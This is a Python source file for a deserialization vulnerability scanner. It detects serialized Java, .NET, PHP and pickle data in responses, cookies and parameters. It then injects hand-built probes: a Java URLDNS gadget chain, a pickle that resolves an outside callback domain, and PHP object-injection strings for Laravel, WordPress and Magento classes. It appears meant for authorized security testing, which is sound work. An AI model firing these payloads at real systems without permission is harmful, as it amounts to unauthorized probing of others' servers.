#!/usr/bin/env python3
"""
deserial_scan.py — Deserialization Vulnerability Scanner

Detects serialized objects in HTTP responses, cookies, headers, and
parameters, then assesses exploitability via callback payloads.

Detects:
  - Java: rO0AB (base64), aced0005 (hex), H4sIAAAA (gzip+base64)
  - .NET: AAEAAAD (BinaryFormatter), __VIEWSTATE (MAC validation check)
  - PHP: O:<len>:"class", a:<len>:{, s:<len>:"
  - Python: pickle protocol markers (\\x80\\x03-\\x05)

Severity classification:
  P1:DESERIAL:CRIT   — DNS/HTTP callback confirmed after payload injection
  P1:DESERIAL:HIGH   — serialized data in user-controllable input + vulnerable framework
  P2:DESERIAL:HIGH   — .NET ViewState without MAC validation
  P2:DESERIAL:MEDIUM — serialized objects detected in responses/cookies (detection only)
  P3:DESERIAL:LOW    — serialization markers found but not in controllable locations

Safety: Only uses DNS callback payloads (URLDNS chain). No command execution.

Output format: [Px:TYPE:CONFIDENCE] TEST_NAME | url | detail

Usage:
  python3 deserial_scan.py -i urls.txt -o findings.txt -t 10
  python3 deserial_scan.py -i urls.txt -o /dev/stdout --callback-domain oast.fun
  python3 deserial_scan.py -i urls.txt -o /dev/stdout --dry-run
"""

import argparse
import base64
import hashlib
import io
import re
import struct
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Globals set from args ──
SESSION = None
TIMEOUT = 10
USER_AGENT = "noleak"
CALLBACK_DOMAIN = ""

# ── Serialization detection patterns ──
# (compiled_regex, description, format_type, controllable_weight)
# controllable_weight: higher = more likely user-controllable
SERIAL_PATTERNS = [
    # Java serialized object (base64-encoded \xac\xed\x00\x05)
    (re.compile(r"rO0AB[A-Za-z0-9+/=]{10,}"), "JAVA_SERIAL_B64", "java", 3),
    # Java serialized object (hex)
    (re.compile(r"aced0005[0-9a-fA-F]{10,}"), "JAVA_SERIAL_HEX", "java", 3),
    # Java gzip+base64 (H4sIAAAA = gzip magic bytes base64)
    (re.compile(r"H4sIAAAA[A-Za-z0-9+/=]{10,}"), "JAVA_GZIP_B64", "java", 2),
    # .NET BinaryFormatter (base64-encoded AAEAAAD)
    (re.compile(r"AAEAAAD[A-Za-z0-9+/=]{10,}"), "DOTNET_BINARY_B64", "dotnet", 3),
    # PHP serialized object: O:8:"ClassName":2:{
    (re.compile(r'O:\d+:"[A-Za-z_\\][A-Za-z0-9_\\]*":\d+:\{'), "PHP_OBJECT", "php", 3),
    # PHP serialized array: a:3:{
    (re.compile(r'a:\d+:\{[sbiOad]:\d+'), "PHP_ARRAY", "php", 2),
    # PHP serialized string: s:5:"hello"
    (re.compile(r's:\d+:"[^"]{0,100}"'), "PHP_STRING", "php", 1),
    # Python pickle v3 (base64: \x80\x03 = gAM)
    (re.compile(r"gAM[A-Za-z0-9+/=]{10,}"), "PICKLE_V3_B64", "python", 3),
    # Python pickle v4 (base64: \x80\x04 = gAQ)
    (re.compile(r"gAQ[A-Za-z0-9+/=]{10,}"), "PICKLE_V4_B64", "python", 3),
    # Python pickle v5 (base64: \x80\x05 = gAU)
    (re.compile(r"gAU[A-Za-z0-9+/=]{10,}"), "PICKLE_V5_B64", "python", 3),
]

# .NET ViewState patterns
VIEWSTATE_RE = re.compile(
    r'<input[^>]+name="__VIEWSTATE"[^>]+value="([^"]*)"', re.I
)
VIEWSTATE_ALT_RE = re.compile(
    r'<input[^>]+value="([^"]*)"[^>]+name="__VIEWSTATE"', re.I
)
VIEWSTATE_GEN_RE = re.compile(
    r'<input[^>]+name="__VIEWSTATEGENERATOR"[^>]+value="([^"]*)"', re.I
)
EVENT_VALIDATION_RE = re.compile(
    r'<input[^>]+name="__EVENTVALIDATION"[^>]+value="([^"]*)"', re.I
)

# Cookie names commonly carrying serialized data
SERIAL_COOKIE_NAMES = re.compile(
    r"(remember[-_]?me|JSESSIONID|session|token|auth|payload|data|state|"
    r"laravel_session|PHPSESSID|connect\.sid|express\.sid)", re.I
)

# Common deserialization-prone parameter names
DESER_PARAM_NAMES = re.compile(
    r"(data|token|session|object|payload|viewstate|state|serialized|"
    r"obj|pickle|b64|encoded|import|export|restore|load)", re.I
)

# Static asset filter
SKIP_EXT = re.compile(
    r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|"
    r"pdf|zip|tar|gz|mp4|mp3|webp|avif)(\?|$)", re.I
)

# Priority endpoint filter (more likely to handle serialized data)
PRIORITY_RE = re.compile(
    r"\.(aspx?|ashx|asmx|jsp|do|action|jsf)(\?|$)|"
    r"/(api|v[0-9]|rest|import|export|upload|decode|process|submit)/", re.I
)


# ── Java URLDNS Payload Generator ──
# Generates a minimal ysoserial-compatible URLDNS gadget chain.
# This ONLY triggers a DNS lookup — no code execution on target.

def _java_utf(s):
    """Encode string as Java modified UTF-8 for serialization."""
    encoded = s.encode("utf-8")
    return struct.pack(">H", len(encoded)) + encoded


def _build_urldns_payload(callback_url):
    """
    Build a Java URLDNS serialization payload.

    The URLDNS gadget chain:
      HashMap.readObject() -> HashMap.hash() -> URL.hashCode() ->
      URLStreamHandler.hashCode() -> URLStreamHandler.getHostAddress() ->
      InetAddress.getByName() -> DNS lookup

    This is the safest ysoserial chain — DNS resolution only.
    Returns base64-encoded serialized Java object.
    """
    url_str = f"http://{callback_url}"

    stream = io.BytesIO()

    # Magic + version
    stream.write(b"\xac\xed\x00\x05")

    # TC_OBJECT
    stream.write(b"\x73")

    # TC_CLASSDESC for java.util.HashMap
    stream.write(b"\x72")
    stream.write(_java_utf("java.util.HashMap"))
    # serialVersionUID
    stream.write(struct.pack(">q", 362498820763181265))
    # classDescFlags: SC_WRITE_METHOD | SC_SERIALIZABLE
    stream.write(b"\x03")
    # field count: 2 (loadFactor, threshold)
    stream.write(struct.pack(">H", 2))
    # Field: float loadFactor
    stream.write(b"\x46")  # typecode 'F'
    stream.write(_java_utf("loadFactor"))
    # Field: int threshold
    stream.write(b"\x49")  # typecode 'I'
    stream.write(_java_utf("threshold"))
    # classAnnotation: TC_ENDBLOCKDATA
    stream.write(b"\x78")
    # superClassDesc: TC_NULL
    stream.write(b"\x70")

    # objectAnnotation (HashMap custom writeObject data)
    stream.write(struct.pack(">f", 0.75))   # loadFactor
    stream.write(struct.pack(">i", 12))     # threshold
    stream.write(struct.pack(">i", 16))     # capacity (buckets)
    stream.write(struct.pack(">i", 1))      # size (1 entry)

    # Key: java.net.URL object
    stream.write(b"\x73")  # TC_OBJECT

    # TC_CLASSDESC for java.net.URL
    stream.write(b"\x72")
    stream.write(_java_utf("java.net.URL"))
    stream.write(struct.pack(">q", -7627629688361524110))
    stream.write(b"\x03")  # SC_WRITE_METHOD | SC_SERIALIZABLE
    stream.write(struct.pack(">H", 7))  # 7 fields

    # Fields of java.net.URL
    stream.write(b"\x49")  # int hashCode
    stream.write(_java_utf("hashCode"))
    stream.write(b"\x49")  # int port
    stream.write(_java_utf("port"))
    stream.write(b"\x4c")  # String authority
    stream.write(_java_utf("authority"))
    stream.write(b"\x74")  # TC_STRING
    stream.write(_java_utf("Ljava/lang/String;"))
    stream.write(b"\x4c")  # String file
    stream.write(_java_utf("file"))
    stream.write(b"\x71")  # TC_REFERENCE
    stream.write(struct.pack(">I", 0x7e0003))
    stream.write(b"\x4c")  # String host
    stream.write(_java_utf("host"))
    stream.write(b"\x71")
    stream.write(struct.pack(">I", 0x7e0003))
    stream.write(b"\x4c")  # String protocol
    stream.write(_java_utf("protocol"))
    stream.write(b"\x71")
    stream.write(struct.pack(">I", 0x7e0003))
    stream.write(b"\x4c")  # String ref
    stream.write(_java_utf("ref"))
    stream.write(b"\x71")
    stream.write(struct.pack(">I", 0x7e0003))

    # classAnnotation + superClassDesc
    stream.write(b"\x78")  # TC_ENDBLOCKDATA
    stream.write(b"\x70")  # TC_NULL

    # URL field values
    stream.write(struct.pack(">i", -1))  # hashCode = -1 (forces recalc -> DNS)
    stream.write(struct.pack(">i", -1))  # port = -1
    stream.write(b"\x74")               # authority
    stream.write(_java_utf(callback_url))
    stream.write(b"\x74")               # file
    stream.write(_java_utf("/"))
    stream.write(b"\x74")               # host
    stream.write(_java_utf(callback_url))
    stream.write(b"\x74")               # protocol
    stream.write(_java_utf("http"))
    stream.write(b"\x70")               # ref = null

    # URL writeObject annotation
    stream.write(b"\x78")  # TC_ENDBLOCKDATA

    # Value for HashMap entry
    stream.write(b"\x74")
    stream.write(_java_utf("deserial_probe"))

    # End of HashMap data
    stream.write(b"\x78")  # TC_ENDBLOCKDATA

    return base64.b64encode(stream.getvalue()).decode("ascii")


def _build_pickle_dns_payload(callback_url):
    """
    Build a Python pickle payload that triggers DNS lookup via socket.getaddrinfo.
    Uses pickle protocol 3. DNS only — no command execution.
    Returns base64-encoded pickle bytes.
    """
    payload = (
        b"\x80\x03"      # PROTO 3
        b"c"              # GLOBAL
        b"socket\n"
        b"getaddrinfo\n"
        b"("              # MARK
        b"X" + struct.pack("<I", len(callback_url))
        + callback_url.encode()
        + b"X" + struct.pack("<I", 2) + b"80"  # port as string
        + b"t"            # TUPLE
        + b"R"            # REDUCE
        + b"."            # STOP
    )
    return base64.b64encode(payload).decode("ascii")


# ── PHP object injection test payloads ──
PHP_TEST_PAYLOADS = [
    # stdClass — triggers deserialization engine, harmless
    ('O:8:"stdClass":0:{}', "STDCLASS"),
    # Boolean true injection (type juggling)
    ("b:1;", "BOOL_TRUE"),
    # Laravel POP chain indicator (truncated, safe)
    ('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}', "LARAVEL_POP"),
    # WordPress POP chain indicator
    ('O:21:"WP_Theme_JSON_Gutenberg":0:{}', "WORDPRESS_POP"),
    # Magento POP chain indicator
    ('O:27:"Magento\\Framework\\Simplexml":0:{}', "MAGENTO_POP"),
]


def safe_get(url, extra_headers=None):
    """GET request returning (status, headers_dict, body, cookies_dict)."""
    try:
        hdrs = {}
        if extra_headers:
            hdrs.update(extra_headers)
        resp = SESSION.get(url, headers=hdrs, allow_redirects=True,
                           timeout=TIMEOUT, verify=False)
        return resp.status_code, dict(resp.headers), resp.text, dict(resp.cookies)
    except requests.RequestException:
        return None, {}, "", {}


def safe_post(url, data=None, extra_headers=None):
    """POST request returning (status, headers_dict, body)."""
    try:
        hdrs = {}
        if extra_headers:
            hdrs.update(extra_headers)
        resp = SESSION.post(url, data=data, headers=hdrs,
                            allow_redirects=False, timeout=TIMEOUT, verify=False)
        return resp.status_code, dict(resp.headers), resp.text
    except requests.RequestException:
        return None, {}, ""


def inject_param(url, param, payload):
    """Replace a single query parameter value with payload."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if param not in params:
        return None
    params[param] = [payload]
    flat = {k: v[0] for k, v in params.items()}
    new_query = urlencode(flat)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, new_query, parsed.fragment))


def get_params(url):
    """Extract query parameter names from URL."""
    parsed = urlparse(url)
    return list(parse_qs(parsed.query, keep_blank_values=True).keys())


# ── Detection Phase ──

def scan_text_for_markers(text, source_label):
    """Scan arbitrary text for serialization markers. Returns list of detections."""
    detections = []
    for pattern, desc, fmt, weight in SERIAL_PATTERNS:
        matches = pattern.findall(text)
        if matches:
            for match in matches[:3]:
                preview = match[:60] + "..." if len(match) > 60 else match
                detections.append({
                    "type": desc, "format": fmt, "preview": preview,
                    "source": source_label, "weight": weight,
                })
    return detections


def scan_cookies_for_markers(cookies):
    """Scan cookie values for serialized data markers."""
    detections = []
    for name, value in cookies.items():
        # Check against regex patterns
        for pattern, desc, fmt, weight in SERIAL_PATTERNS:
            if pattern.search(value):
                preview = value[:60] + "..." if len(value) > 60 else value
                detections.append({
                    "type": desc, "format": fmt, "preview": preview,
                    "source": f"cookie:{name}", "weight": weight + 1,
                })
                break

        # Try base64 decode for raw magic bytes
        try:
            decoded = base64.b64decode(value)
            if decoded[:2] == b"\xac\xed":
                detections.append({
                    "type": "JAVA_SERIAL_COOKIE_RAW", "format": "java",
                    "preview": value[:40], "source": f"cookie:{name}", "weight": 4,
                })
            elif decoded[:2] in (b"\x80\x03", b"\x80\x04", b"\x80\x05"):
                detections.append({
                    "type": "PICKLE_COOKIE_RAW", "format": "python",
                    "preview": value[:40], "source": f"cookie:{name}", "weight": 4,
                })
        except Exception:
            pass

        # Flask/itsdangerous signed cookies (base64.base64.signature format)
        if "." in value and SERIAL_COOKIE_NAMES.search(name):
            parts = value.split(".")
            if len(parts) >= 2:
                try:
                    padded = parts[0] + "=" * (4 - len(parts[0]) % 4)
                    decoded = base64.urlsafe_b64decode(padded)
                    if decoded[:2] in (b"\x80\x03", b"\x80\x04", b"\x80\x05"):
                        detections.append({
                            "type": "FLASK_PICKLE_COOKIE", "format": "python",
                            "preview": value[:50], "source": f"cookie:{name}",
                            "weight": 4,
                        })
                except Exception:
                    pass

    return detections


def check_viewstate(body, url, headers):
    """Analyze .NET ViewState for MAC validation status."""
    findings = []

    vs_match = VIEWSTATE_RE.search(body) or VIEWSTATE_ALT_RE.search(body)
    if not vs_match:
        return findings

    viewstate = vs_match.group(1)
    if not viewstate:
        return findings

    vs_gen_match = VIEWSTATE_GEN_RE.search(body)
    ev_match = EVENT_VALIDATION_RE.search(body)

    vs_gen = vs_gen_match.group(1) if vs_gen_match else "absent"
    has_event_validation = ev_match is not None

    # Decode ViewState to inspect contents
    try:
        decoded = base64.b64decode(viewstate)
        vs_size = len(decoded)
    except Exception:
        decoded = b""
        vs_size = len(viewstate)

    # Check for X-AspNet-Version header
    aspnet_version = headers.get("X-AspNet-Version", "unknown")

    # MAC validation indicators:
    # - No __EVENTVALIDATION + ViewState present = potentially unprotected
    # - ASP.NET < 4.5.2 had MAC off by default in some configurations

    if not has_event_validation and vs_size > 20:
        findings.append(
            f"[P2:DESERIAL:HIGH] VIEWSTATE_NO_MAC | {url} | "
            f"__VIEWSTATE ({vs_size}B) without __EVENTVALIDATION — "
            f"MAC validation may be disabled | "
            f"generator={vs_gen} aspnet={aspnet_version}"
        )

    # .NET 1.x unprotected ViewState header (\xff\x01)
    if decoded and decoded[:2] == b"\xff\x01":
        findings.append(
            f"[P2:DESERIAL:HIGH] VIEWSTATE_V1_UNPROTECTED | {url} | "
            f"ViewState uses .NET 1.x format (\\xff\\x01) — "
            f"likely no MAC protection | size={vs_size}B"
        )

    # Large ViewState = more attack surface
    if vs_size > 1000:
        severity = "P2" if not has_event_validation else "P3"
        findings.append(
            f"[{severity}:DESERIAL:MEDIUM] VIEWSTATE_LARGE | {url} | "
            f"Large __VIEWSTATE ({vs_size}B) | generator={vs_gen} | "
            f"event_validation={'yes' if has_event_validation else 'NO'}"
        )

    # BinaryFormatter marker in decoded ViewState
    if decoded:
        try:
            vs_b64 = base64.b64encode(decoded[:20]).decode()
            if "AAEAAAD" in vs_b64:
                findings.append(
                    f"[P1:DESERIAL:HIGH] VIEWSTATE_BINARYFORMATTER | {url} | "
                    f"ViewState contains BinaryFormatter serialized data — "
                    f"potential RCE via ObjectDataProvider/TypeConfuseDelegate"
                )
        except Exception:
            pass

    return findings


# ── Vulnerability Assessment Phase ──

def assess_java(url, detection, callback_domain):
    """Assess Java deserialization finding. Optionally inject URLDNS payload."""
    findings = []
    source = detection["source"]

    if not callback_domain:
        if "cookie" in source or "param" in source:
            findings.append(
                f"[P1:DESERIAL:HIGH] JAVA_SERIAL_CONTROLLABLE | {url} | "
                f"Java serialized object in {source}: {detection['preview']} | "
                f"User-controllable location — needs callback testing"
            )
        else:
            findings.append(
                f"[P2:DESERIAL:MEDIUM] JAVA_SERIAL_DETECTED | {url} | "
                f"Java serialized object in {source}: {detection['preview']}"
            )
        return findings

    # Generate unique callback subdomain
    tag = hashlib.md5(f"{url}:{source}".encode()).hexdigest()[:8]
    cb_host = f"ds-{tag}.{callback_domain}"

    try:
        payload_b64 = _build_urldns_payload(cb_host)
    except Exception:
        findings.append(
            f"[P2:DESERIAL:MEDIUM] JAVA_SERIAL_DETECTED | {url} | "
            f"Java serialized object in {source}: {detection['preview']}"
        )
        return findings

    # Inject payload into the location where serialized data was found
    injected = False

    if source.startswith("cookie:"):
        cookie_name = source.split(":", 1)[1]
        status, _, body = safe_post(url, extra_headers={
            "Cookie": f"{cookie_name}={payload_b64}"
        })
        injected = True

    elif source.startswith("param:"):
        param_name = source.split(":", 1)[1]
        test_url = inject_param(url, param_name, payload_b64)
        if test_url:
            status, _, body, _ = safe_get(test_url)
            injected = True

    elif source == "response_body":
        for pname in ["data", "object", "payload", "token", "session", "state"]:
            parsed = urlparse(url)
            test_qs = urlencode({pname: payload_b64})
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   "", test_qs, ""))
            status, _, body, _ = safe_get(test_url)
            if status and status != 404:
                injected = True
                break

    if injected:
        time.sleep(2)
        findings.append(
            f"[P1:DESERIAL:HIGH] JAVA_URLDNS_INJECTED | {url} | "
            f"URLDNS payload injected via {source} — check {cb_host} for DNS callback | "
            f"Original: {detection['preview']}"
        )
    else:
        findings.append(
            f"[P2:DESERIAL:MEDIUM] JAVA_SERIAL_DETECTED | {url} | "
            f"Java serialized object in {source}: {detection['preview']}"
        )

    return findings


def assess_dotnet(url, detection, body, headers, callback_domain):
    """Assess .NET deserialization finding."""
    findings = []
    source = detection["source"]

    if detection["type"] == "DOTNET_BINARY_B64":
        if "cookie" in source or "param" in source:
            findings.append(
                f"[P1:DESERIAL:HIGH] DOTNET_BINARYFORMATTER_CONTROLLABLE | {url} | "
                f"BinaryFormatter data in {source}: {detection['preview']} | "
                f"BinaryFormatter is inherently unsafe — potential RCE"
            )
        else:
            findings.append(
                f"[P2:DESERIAL:MEDIUM] DOTNET_BINARYFORMATTER_DETECTED | {url} | "
                f"BinaryFormatter data in {source}: {detection['preview']}"
            )

    return findings


def assess_php(url, detection, callback_domain):
    """Assess PHP deserialization finding. Test object injection."""
    findings = []
    source = detection["source"]

    if "cookie" not in source and "param" not in source:
        findings.append(
            f"[P3:DESERIAL:LOW] PHP_SERIAL_RESPONSE | {url} | "
            f"PHP serialized data in {source}: {detection['preview']}"
        )
        return findings

    findings.append(
        f"[P1:DESERIAL:HIGH] PHP_SERIAL_CONTROLLABLE | {url} | "
        f"PHP serialized data in user-controllable {source}: {detection['preview']}"
    )

    # Test PHP object injection payloads
    for payload, payload_name in PHP_TEST_PAYLOADS:
        injected = False
        resp_body = ""

        if source.startswith("cookie:"):
            cookie_name = source.split(":", 1)[1]
            status, _, resp_body = safe_post(url, extra_headers={
                "Cookie": f"{cookie_name}={quote(payload)}"
            })
            injected = status is not None

        elif source.startswith("param:"):
            param_name = source.split(":", 1)[1]
            test_url = inject_param(url, param_name, payload)
            if test_url:
                status, _, resp_body, _ = safe_get(test_url)
                injected = status is not None

        if injected and resp_body:
            lower_body = resp_body.lower()
            deser_indicators = [
                "unserialize", "__wakeup", "__destruct", "__tostring",
                "allowed_classes", "object of class", "cannot access",
                "pendingbroadcast", "illuminate\\",
            ]
            for indicator in deser_indicators:
                if indicator in lower_body:
                    findings.append(
                        f"[P1:DESERIAL:CRIT] PHP_OBJECT_INJECT_{payload_name} | {url} | "
                        f"PHP deserialization confirmed via {source} — "
                        f"indicator '{indicator}' in response | payload={payload[:40]}"
                    )
                    break

    return findings


def assess_python(url, detection, callback_domain):
    """Assess Python pickle finding. Optionally inject DNS payload."""
    findings = []
    source = detection["source"]

    if "cookie" in source or "param" in source:
        severity = "P1:DESERIAL:HIGH"
        msg = "Python pickle in user-controllable location — RCE likely possible"
    else:
        severity = "P2:DESERIAL:MEDIUM"
        msg = "Python pickle detected in response"

    findings.append(
        f"[{severity}] PICKLE_DETECTED | {url} | "
        f"{msg} | {source}: {detection['preview']}"
    )

    if not callback_domain or ("cookie" not in source and "param" not in source):
        return findings

    # Inject DNS-only pickle payload
    tag = hashlib.md5(f"{url}:{source}".encode()).hexdigest()[:8]
    cb_host = f"pk-{tag}.{callback_domain}"

    try:
        payload_b64 = _build_pickle_dns_payload(cb_host)
    except Exception:
        return findings

    injected = False

    if source.startswith("cookie:"):
        cookie_name = source.split(":", 1)[1]
        status, _, body = safe_post(url, extra_headers={
            "Cookie": f"{cookie_name}={payload_b64}"
        })
        injected = True

    elif source.startswith("param:"):
        param_name = source.split(":", 1)[1]
        test_url = inject_param(url, param_name, payload_b64)
        if test_url:
            status, _, body, _ = safe_get(test_url)
            injected = True

    if injected:
        time.sleep(2)
        findings.append(
            f"[P1:DESERIAL:HIGH] PICKLE_DNS_INJECTED | {url} | "
            f"Pickle DNS payload injected via {source} — check {cb_host} for callback"
        )

    return findings


# ── Main URL Testing Pipeline ──

def test_url(url):
    """Full deserialization test pipeline for a single URL."""
    findings = []

    # Step 1: Fetch the URL
    status, headers, body, cookies = safe_get(url)
    if status is None:
        return findings

    all_detections = []

    # Step 2a: Scan response body for serialization markers
    body_detections = scan_text_for_markers(body, "response_body")
    all_detections.extend(body_detections)

    # Step 2b: Scan response headers
    for hdr_name, hdr_value in headers.items():
        hdr_detections = scan_text_for_markers(str(hdr_value), f"header:{hdr_name}")
        all_detections.extend(hdr_detections)

    # Step 2c: Scan cookies
    cookie_detections = scan_cookies_for_markers(cookies)
    all_detections.extend(cookie_detections)

    # Step 2d: Scan URL parameters
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    for pname, pvalues in params.items():
        for pval in pvalues:
            param_detections = scan_text_for_markers(pval, f"param:{pname}")
            all_detections.extend(param_detections)

    # Step 3: Check .NET ViewState specifically
    vs_findings = check_viewstate(body, url, headers)
    findings.extend(vs_findings)

    # Step 4: Assess each detection by format
    for det in all_detections:
        fmt = det["format"]

        if fmt == "java":
            findings.extend(assess_java(url, det, CALLBACK_DOMAIN))
        elif fmt == "dotnet":
            findings.extend(assess_dotnet(url, det, body, headers, CALLBACK_DOMAIN))
        elif fmt == "php":
            findings.extend(assess_php(url, det, CALLBACK_DOMAIN))
        elif fmt == "python":
            findings.extend(assess_python(url, det, CALLBACK_DOMAIN))

    # Step 5: Probe deserialization-prone params even without markers
    if not all_detections and params:
        for pname in params:
            if DESER_PARAM_NAMES.search(pname):
                # Send Java serialization marker to detect processing
                test_payload = "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtePwkI1eJL8AgABWgAFdmFsdWV4cAE="
                test_url_str = inject_param(url, pname, test_payload)
                if test_url_str:
                    t_status, _, t_body, _ = safe_get(test_url_str)
                    if t_status and t_status != 404:
                        lower = t_body.lower()
                        java_indicators = [
                            "classnotfound", "deseriali", "objectinput",
                            "java.io", "invalid stream", "serialversionuid",
                            "classcast", "java.lang",
                        ]
                        for ind in java_indicators:
                            if ind in lower:
                                findings.append(
                                    f"[P1:DESERIAL:HIGH] JAVA_DESER_ENDPOINT | "
                                    f"{url} param={pname} | "
                                    f"Endpoint processes Java serialized data — "
                                    f"indicator '{ind}' in response (status={t_status})"
                                )
                                break

    # Deduplicate findings for this URL
    return list(dict.fromkeys(findings))


def main():
    parser = argparse.ArgumentParser(
        description="Deserialization Vulnerability Scanner"
    )
    parser.add_argument("-i", "--input", required=True,
                        help="Input file with URLs to scan")
    parser.add_argument("-o", "--output", default="deserial_findings.txt",
                        help="Output file for findings (default: deserial_findings.txt)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                        help="Thread count (default: 10)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="HTTP request timeout in seconds (default: 10)")
    parser.add_argument("--user-agent", default="noleak",
                        help="User-Agent string for requests")
    parser.add_argument("--callback-domain", default="",
                        help="Interactsh/OAST callback domain for OOB testing")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print targets without making requests")
    parser.add_argument("--max-urls", type=int, default=3000,
                        help="Max URLs to scan (default: 3000)")
    args = parser.parse_args()

    # Configure globals
    global SESSION, TIMEOUT, USER_AGENT, CALLBACK_DOMAIN
    TIMEOUT = args.timeout
    USER_AGENT = args.user_agent
    CALLBACK_DOMAIN = args.callback_domain
    SESSION = requests.Session()
    SESSION.headers.update({"User-Agent": USER_AGENT})

    # Load URLs
    try:
        with open(args.input, "r") as f:
            raw_urls = [line.strip() for line in f
                        if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not raw_urls:
        print("[*] No URLs to test")
        return

    # Filter static assets, prioritize deserialization-prone endpoints
    priority_urls = [u for u in raw_urls
                     if not SKIP_EXT.search(u) and PRIORITY_RE.search(u)]
    other_urls = [u for u in raw_urls
                  if not SKIP_EXT.search(u) and not PRIORITY_RE.search(u)]

    # Deduplicate by host+path
    seen = set()
    urls = []
    for url in priority_urls + other_urls:
        p = urlparse(url)
        key = f"{p.netloc}{p.path}"
        if key not in seen:
            seen.add(key)
            urls.append(url)
        if len(urls) >= args.max_urls:
            break

    print(f"[*] Loaded {len(raw_urls)} raw URLs, filtered to {len(urls)} "
          f"({len(priority_urls)} priority)")
    if CALLBACK_DOMAIN:
        print(f"[*] Callback domain: {CALLBACK_DOMAIN}")
    else:
        print("[*] No callback domain — running detection-only mode")

    if args.dry_run:
        for url in urls:
            print(f"[DRY-RUN] {url}")
        return

    # Thread-safe collection
    lock = threading.Lock()
    progress = [0]
    all_findings = []

    def worker(url):
        findings = test_url(url)
        with lock:
            progress[0] += 1
            if progress[0] % 50 == 0 or findings:
                print(f"[*] Progress: {progress[0]}/{len(urls)} URLs scanned")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(worker, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}", file=sys.stderr)

    # Write output
    try:
        with open(args.output, "w") as f:
            for line in all_findings:
                f.write(line + "\n")
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(urls)} URLs tested, "
          f"{len(all_findings)} finding(s)")
    if all_findings:
        print(f"[*] Results written to {args.output}")


if __name__ == "__main__":
    main()
